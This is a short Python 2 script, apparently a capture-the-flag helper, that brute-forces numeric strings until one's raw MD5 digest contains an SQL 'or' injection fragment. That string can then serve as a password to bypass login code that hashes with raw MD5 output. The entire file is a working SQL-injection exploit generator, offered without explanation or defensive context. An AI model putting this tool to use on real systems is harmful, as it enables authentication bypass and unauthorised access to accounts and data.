import re
import string
import random
import hashlib

def main():
	regex = ".*'((or)|([|][|]))'[1-9]" or ".*'((or)|([|][|]))'[1-9]"	
	while 1:
		s = ''.join(random.choice(string.digits) for _ in range(37))		
		print s
		m = hashlib.md5()
		m.update(s)
		if re.search(regex, str(m.digest()), re.I ):
			print "Passward:" + s
			break         

main()